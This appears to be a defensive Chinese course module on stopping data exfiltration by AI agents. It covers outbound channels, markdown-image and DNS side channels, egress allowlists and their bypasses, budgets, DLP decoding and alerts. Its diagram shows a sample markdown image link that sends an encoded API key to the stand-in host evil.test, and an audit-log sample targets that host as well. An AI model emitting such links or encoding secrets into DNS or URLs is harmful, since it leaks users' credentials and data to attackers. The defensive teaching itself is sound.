04 · 数据外泄与出站控制

出站通道一半不需要网络权限：只要 agent 能输出文本、而客户端会渲染 markdown，通道就已经存在了（一张外链图片的 URL 就能带走一个 API key）；而 DNS 查询在多数沙箱里是默认放通的 · 「限制单次请求大小」几乎没有防御价值——一个 4KB 的私钥用 100 字节/次的 DNS 通道也只需要 41 次查询 · 出站白名单是本课唯一的网络层不变量：它不判断内容只判断目标，攻击者换说法无效；但它有四类绕过——重定向、DNS 侧信道、白名单内攻击者可控的接收端、SSRF · 可泄漏量 $\le \min(R \cdot T \cdot B,\ V)$，而$V$（能读到的数据）是唯一有硬上界的项——notebook 里那个常驻 agent 的例子：常驻一个月后，降速的效果完全消失 · 速率限制的真实作用不是阻止外泄，而是把外泄推入检测器的视野 · DLP 里「已知秘密的精确匹配」最容易做、效果最好、却最少被做，而它的前提是先解码再扫（不解码时 base64/hex 编码的密钥全部漏掉）

1出站通道比你想的多得多

模块 00 说过「对外通信」的定义比直觉宽得多。这一节把它彻底展开——因为「致命三要素」里最容易去掉的就是这一项，而要去掉它，你首先得知道它有多少个入口。

通道机制需要 agent 有什么权限常被忽略的程度
HTTP 请求直接调用出站接口网络访问低（大家都知道）
发邮件 / 发消息把内容作为正文或收件人邮件/IM 工具低
渲染外链图片输出 ![](https://evil/…?d=DATA)，客户端渲染时发起请求只需要「能输出文本」极高
可点击链接输出一个诱导用户点击的链接，数据在 query 里只需要能输出文本高
写公开位置写进公开仓库、公开文档、评论区写权限中
DNS 查询把数据编码进子域名，权威 DNS 服务器就能收到只需要能发起任何域名解析极高
第三方 API 的副作用把数据塞进「搜索关键词」「工单标题」，攻击者从对端读取任何写外部系统的工具高
错误信息回显构造一个会把数据带进报错的调用，报错被记录到外部日志任何工具高
时序信道用「快慢」编码比特（比如按位决定要不要 sleep）任何可观测耗时的操作中（带宽极低）
提交给用户看的输出如果用户会把输出复制到别处无中

第三行与第六行是本节最重要的两条，因为它们几乎不需要任何权限：只要 agent 能输出文本、而客户端会渲染 markdown，外泄通道就已经存在了——它不需要 HTTP 工具、不需要网络权限、不需要任何「对外通信」的能力声明。同样，DNS 查询在多数沙箱里是默认放通的（否则什么都跑不起来），而一次 DNS 查询就能带走几十字节。

直白说

所以「我没给 agent 网络权限，所以它泄不了数据」这个推理是错的。正确的问法是：从 agent 的输出到攻击者，有没有任何一条路径？而这条路径可能完全不经过 agent 的工具——它可能经过渲染 agent 输出的那个客户端。

严谨说

形式化地说，出站通道的集合不是 agent 权限集的函数，而是整个系统（含客户端、日志、下游服务）的可达性图的函数。agent 只是这张图里的一个节点；「它有没有 HTTP 工具」只决定了其中一条边存不存在。因此出站控制必须在系统边界上做，而不是在 agent 的工具列表上做——这是本模块所有具体手段的共同来源。

2渲染侧信道：一张图片能带走多少

上一节说渲染通道「几乎不需要权限」。这一节把它的带宽算出来，因为带宽决定了它是「理论风险」还是「实际风险」。

agent 输出（纯文本，看起来无害）： ┌────────────────────────────────────────────────────────────────┐ │ 已完成分析。 │ │ ![loading](https://evil.test/p.png?d=QVBJX0tFWT1za18xMjM0NTY3OA)│ └────────────────────────────────────────────────────────────────┘ │ 客户端渲染 markdown → **自动发起 GET 请求** → 攻击者收到 d= 的内容 │ 用户看到的：一张加载失败的小图（或者什么都没看到）
\[\text{每次请求可带走} \approx \frac{L_{\max} - L_{\text{overhead}}}{\text{编码膨胀率}} \ \text{字节}\]
载体长度上限（典型）编码单次带宽评价
URL query 参数约 2000–8000 字符base64（膨胀 4/3）约 1.5–6 KB足够带走 API key、密码、一段对话
URL 路径段同上base64url同上同上
DNS 子域名单标签 63 字符，总长 253base32（膨胀 8/5）约 100 字节/次带宽低但极难封堵
图片 alt / title 文本无硬限制—不外发（除非被别处渲染）低风险
多次请求（分块）无上限分块 + 序号无上限速率限制是唯一的约束

第五行是关键：单次带宽的上限不重要，因为可以分块。一个 4 KB 的密钥文件，用 100 字节/次的 DNS 通道也只需要 41 次查询——而 40 次 DNS 查询在任何监控里都不显眼。所以「限制单次请求大小」几乎没有防御价值；有价值的是「限制出站的目标」（白名单）与「限制总量」（预算）。

为什么这个通道特别难防

  • 它不在 agent 的权限模型里——渲染发生在客户端，而客户端通常不参与 agent 的权限检查；
  • 它对用户不可见——一张 1×1 的图片，或者一张加载失败的图，用户不会注意到；
  • 「禁止输出图片」是一个产品功能的损失，所以它经常被以「影响体验」为理由否掉；
  • 同类通道很多：图片之外还有 iframe、link prefetch、CSS 背景图、字体、视频封面——任何会触发自动网络请求的 markdown/HTML 元素。

可行的防御有三条，按有效性排序：

  1. 渲染侧的域名白名单——只允许从你自己的域名加载图片，其他一律不渲染（显示为纯文本链接）。这是唯一的不变量级防御；
  2. 内容安全策略（CSP）——在 Web 客户端上用 img-src 等指令限制来源。与第一条同一思想，只是实现层不同；
  3. 输出侧剥离——把 agent 输出里的图片语法转成纯文本。有效但是检测性质的（编码变体、HTML 实体等有绕过空间）。

3出站白名单：唯一的不变量级防御，以及它的四类绕过

模块 00 说「三要素里最容易去掉的是对外通信」。去掉它的具体手段就是出站白名单——而它是本课唯一一个「做对了就是不变量」的网络层机制。

为什么它是不变量

直白说

白名单的性质与检测器根本不同：它不判断内容，只判断目标。无论注入写得多巧妙，如果 evil.test 不在白名单里，那个请求就发不出去——而攻击者无法通过「换个说法」来改变这一点。他必须找到一个在白名单里的目标，而那是一个完全不同、也难得多的问题。

严谨说

形式化地说，白名单把出站的目标集合从 $\mathcal{D}$（全部域名）限制到 $A \subset \mathcal{D}$，而 $|A|$ 通常是个位数。攻击者的搜索空间从「所有域名」缩小到「$A$ 中恰好可被他控制或读取的那些」，在多数情况下这个集合是空的。这是一个状态可达性层面的约束，而不是概率性的判断——这就是它与 DLP 检测（第 5 节）的本质区别。

四类绕过，以及各自的修法

绕过机制修法
DNS 侧信道白名单只检查 HTTP 目标，但解析域名本身就发出了 DNS 查询用固定的内部 DNS 解析器 + 只解析白名单域名；沙箱内不允许任意 DNS
重定向请求白名单内的 URL，它 302 跳到攻击者的域名禁止跟随重定向，或对每一跳都做白名单检查
白名单内的可写目标白名单里有一个「任何人都能读写」的服务（公开粘贴板、公共 issue 追踪）白名单要精确到路径/资源，不只是域名；审阅每一项的可读写性
SSRF 式内网穿透目标解析到内网地址或元数据服务解析后校验 IP 不在私有网段（含 IPv6 与 169.254.x.x）

第三类最隐蔽，也最常见：白名单里放了一个「看起来无害」的公共服务。比如把某个公开的代码托管站加进白名单（因为要装依赖），而那个站上任何人都能创建一个仓库并读取它收到的内容——于是白名单里就有了一个攻击者可控的接收端。所以白名单的每一项都要回答：「攻击者能不能在这个域名下控制一个接收数据的地方」。

实现位置：为什么必须在网络层

白名单不能只在工具层实现（「只有 http_get 工具会检查目标」），因为第 1 节列的通道里有一半不经过工具。正确的实现位置有三个，通常要同时做：

  • 网络出口（代理 / 防火墙）——覆盖所有从沙箱发出的连接，包括 agent 自己写的代码发起的；
  • DNS 解析器——覆盖 DNS 侧信道；
  • 渲染客户端（CSP）——覆盖渲染侧信道（第 2 节）。

4出站预算：把「能泄多少」变成一个可计算的量

白名单管「能发给谁」，预算管「能发多少」。两者互补：白名单挡住已知的坏目标，预算限制未知漏洞的爆炸半径。

\[\text{可泄漏量} \le \min\big(\underbrace{R \cdot T \cdot B}_{\text{速率} \times \text{时长} \times \text{单次带宽}},\ \underbrace{V}_{\text{可访问的数据总量}}\big)\]
约束项怎么设效果代价
出站请求速率 $R$每分钟最多 N 次出站把 40 次分块外泄从「几秒」拖到「几分钟」低（正常任务很少高频出站）
会话时长 $T$单会话墙钟上限限制持续外泄的窗口低
单次载荷 $B$限制 URL 长度、请求体大小效果有限（可分块）低
可访问数据量 $V$范围限制（模块 03 第 2 节）效果最好：$V$ 是这个 min 里唯一有硬上界的项需要按任务收窄
出站总字节单会话出站累计上限直接限制乘积中（需要区分正常的大请求）

这个式子最重要的读法是：$V$ 是唯一有硬上界的项。速率、时长、载荷都只能「拖慢」外泄，而缩小 $V$ 是真正减少了可被泄漏的东西。所以「限制 agent 能读到什么」比「限制它能发多快」有效得多——这又一次回到了模块 03 的范围限制。

速率限制的一个反直觉性质

速率限制看起来是一个「拖慢」而不是「阻止」的手段，但它有一个额外的、更重要的作用：它把外泄变成可检测的。

直白说

一次性发走 4 KB 是一个请求，很难与正常请求区分；而分成 40 次小请求发往同一个目标，是一个明显的模式。速率限制迫使攻击者进入这个可检测的模式——它本身不阻止外泄，但它让监控有机会发现。

严谨说

形式化地说，速率限制改变了攻击的可观测特征：在无限制的情况下，外泄的特征是「一个大请求」，而正常流量里也有大请求，所以信噪比很低；在速率限制下，外泄的特征变成「向同一目标的高频小请求」，而这个模式在正常流量里罕见得多。所以速率限制与监控是配套的：它不是独立的防御，而是一个把攻击推入检测器视野的手段。

5DLP：内容侧检测的位置与它的天花板

最后讲内容侧：在数据发出去之前扫一遍，看里面有没有敏感信息。它有价值，但要放在正确的位置上。

检测类型能抓什么召回误伤评价
结构化模式API key、信用卡号、身份证号（有校验位的）高极低性价比最高——先做这个
已知秘密的精确匹配从你的密钥库里取出真实值做匹配极高极低被严重低估（见下）
高熵字符串疑似密钥/token 的随机串中中（base64 的正常数据会误报）作为辅助信号
语义分类「这段话包含个人隐私」中高谨慎使用，且只该降级不该阻断
编码后的内容base64/hex/URL 编码之后的敏感数据需要先解码再扫—最常被漏掉的一步

第二行值得展开，因为它是最容易做、效果最好、却最少被做的一条：你知道自己的密钥是什么——所以直接用它们的真实值做精确匹配。不需要任何模式识别，不需要任何模型，误伤率接近零，召回率接近 100%（只要出站内容里包含那个字符串）。而且它同时覆盖了「密钥被编码后外泄」的情形——只要你在扫描前做了解码（第五行）。

必须先解码再扫

第五行是 DLP 实现里最常见的漏洞：敏感数据被编码之后，模式匹配就失效了。

# ❌ 只扫原文
if API_KEY in outbound_url:
    block()

# ✓ 先把所有可能的编码变体解出来，再扫
candidates = [outbound_url]
candidates += try_base64_decode_all_segments(outbound_url)
candidates += try_url_decode(outbound_url)
candidates += try_hex_decode_all_segments(outbound_url)
candidates += strip_zero_width_chars(outbound_url)      # 不可见字符走私
for c in candidates:
    if any(secret in c for secret in KNOWN_SECRETS):
        block()

关于「不可见字符走私」补一句：有一类编码把数据藏进Unicode 的不可见字符或变体选择符里，使得文本在人眼里完全正常，而机器读到的是另一串内容。所以出站内容与展示给人的内容都应当先做 Unicode 规范化并剥离零宽/控制字符——这既是 DLP 的前置步骤，也是模块 01 「审计模型实际看到的文本」的延伸。

DLP 的正确位置

与 C68 模块 05 的 guardrail 分层完全同构：

  • 白名单与预算是主防线（不变量），DLP 是额外一层；
  • 结构化模式与已知秘密匹配可以直接阻断（误伤极低）；
  • 语义分类只该降级或告警，不该阻断；
  • 所有 DLP 命中都要落审计——它是「有人在尝试外泄」这个信号的主要来源，而这个信号本身比阻断更有价值（它触发调查）。

6出站控制的落地清单

把前五节压成一份可以逐项打勾的清单，按有效性而不是难度排序。

  1. 沙箱默认无网络，所有出站经过一个显式的代理（模块 03 第 3 节）；
  2. 代理上的域名白名单，且每一项都审过「攻击者能否在此控制接收端」；
  3. 禁止跟随重定向，或对每一跳做白名单检查；
  4. 固定的内部 DNS 解析器，只解析白名单域名（封 DNS 侧信道）；
  5. 解析后校验 IP 不在私有网段与元数据地址（封 SSRF）；
  6. 渲染客户端的 CSP / 域名白名单（封渲染侧信道）——这一条经常被漏，因为它不在后端；
  7. 范围限制缩小 $V$（模块 03）——这是「可泄漏量」公式里唯一有硬上界的项；
  8. 出站速率与总字节预算，并把「向同一目标的高频小请求」做成一条告警；
  9. 已知秘密的精确匹配 + 解码后再扫；
  10. 所有出站请求与 DLP 命中落审计，带 provenance（模块 03 第 6 节）。

这十条里，第 1、2、4、6、7 条是不变量（做对了就是「不可达」），第 3、5、8 条是收紧，第 9、10 条是检测与可观测。建设顺序应当按这个分组来，而不是按实现难度——因为不变量的效果不依赖攻击者的水平（模块 00 第 7 节）。

直白说

最后回到模块 00 的那句话：「致命三要素」里最容易去掉的是第三个（对外通信）。这一模块的十条清单就是「去掉它」的具体含义——而做完前七条之后，一个能读私密数据、也接触不受信内容的 agent，其数据外泄的链路已经在结构上断开了。

严谨说

需要诚实地补充它的边界：出站控制不能防「就地破坏」（删文件、改配置、发起内部的不可逆操作），也不能防「通过人来外泄」（agent 把数据写在给用户看的输出里，用户复制到别处）。前者靠模块 03 的可逆性与确认，后者本质上无法用技术手段完全解决——它只能通过「不让 agent 读到不该读的东西」来减轻，也就是再一次回到范围限制（缩小 $V$）。

7出站监控：三条高价值告警

前六节讲的都是阻断。这一节讲看见——因为阻断掉的攻击如果没被记录，你就不知道有人在打你。

告警规则为什么高价值误报来源
白名单拒绝的突增单会话内被拒的出站请求数超过基线它是「有人在尝试外泄」最直接的信号，而且几乎无误报（正常任务很少撞白名单）配置变更后的短期上升
同目标高频小请求同一 (session, host) 5 分钟内 > N 次且平均体积 < 2KB分块外泄的特征（第 4 节）正常的轮询与分页
DLP 命中已知秘密精确匹配或结构化模式命中误伤极低，且命中即确认测试数据里的假密钥

第一条被严重低估：「被白名单拒绝的请求」是一个几乎零误报的攻击信号。正常的 agent 任务极少去连接白名单外的域名——所以一旦出现，要么是配置问题，要么就是有人在尝试外泄。而很多系统只记录「被拒绝了」这个事实，却没有把它做成告警，于是这个高质量信号被埋在日志里。

每条出站记录该带什么

{
  "ts": "2026-08-31T10:14:22Z", "session": "sess-9f21",
  "target": {"host": "evil.test", "path": "/collect", "resolved_ip": "203.0.113.9"},
  "decision": "denied", "reason": "host_not_allowlisted",
  "bytes": 1842,
  "channel": "http_proxy",              // http_proxy | dns | rendered_asset | email
  "provenance": [                        // ← 与模块 03 的审计链同一个字段
    {"source": "user", "trust": 2, "ref": "msg-118"},
    {"source": "web",  "trust": 0, "ref": "https://example.test/a"}
  ],
  "dlp": {"hits": ["known_secret_exact"], "decoded_from": "base64"}
}

channel 与 provenance 两个字段是这里的关键：前者让你能按通道统计（发现「原来 DNS 那条路一直是通的」），后者让你能从一次被拒的请求反查到是哪段内容触发的——而后者是唯一无法事后补上的字段（模块 03 第 6 节）。

8残余风险：出站控制防不住什么

做完前六节的十条清单之后，一个诚实的收尾问题是：还剩下什么。

残余风险为什么出站控制防不住该靠什么
就地破坏删文件、改配置、发起内部的不可逆操作——数据没出去，但事情已经坏了模块 03 的可逆性维度与确认环节
通过人外泄agent 把数据写进给用户看的输出，用户复制到别处只能靠缩小 $V$（不让 agent 读到不该读的）
白名单内的合法泄漏把私密数据写进一个白名单内、但读者范围过宽的内部系统范围限制精确到资源 + DLP
推理式泄漏不直接发原文，而是发「关于原文的结论」（是/否、分类、摘要）窄接口的信息量上界（模块 01 第 4 节）
时序与资源侧信道带宽极低但存在实践中通常接受这个残余风险

第四行是最值得单独说的一条，因为它把话题绕回了模块 01：如果攻击者不需要拿到原文，只需要拿到「关于原文的一个判断」（比如「这个账户余额是否超过某个数」），那么他需要的带宽只有几比特——而几比特几乎无法用出站控制封堵（一次成功/失败的请求就能编码一比特）。唯一有效的手段是限制 agent 输出的信息量本身，也就是双 LLM 的窄接口。

直白说

把这五条残余风险合起来看，会发现一个规律：它们全都指向同一个手段——缩小 agent 能接触到的信息（$V$）与它能产出的信息量。出站控制管的是「数据能不能到达攻击者」，而这五条要么绕过了「出站」这个环节（通过人、通过白名单内系统），要么把数据量压到了出站控制的分辨率之下（推理式泄漏、时序信道）。

严谨说

形式化地说，出站控制是在通道上设约束，而残余风险来自通道之外或通道容量之下。要覆盖它们，必须在信源上设约束——即限制 $H(\text{agent 可访问的信息})$ 与 $H(\text{agent 的输出})$。前者是模块 03 的范围限制，后者是模块 01 的窄接口。这也是为什么本课把这两条反复强调：它们是唯一能覆盖到「通道之外」的手段。

最后一句实践建议：残余风险应当被写下来，而不是被忽略。一份「我们的出站控制防住了 A/B/C，防不住 D/E」的文档，比一份「我们做了出站控制」的声明有用得多——因为它让下一个人知道该往哪里继续。
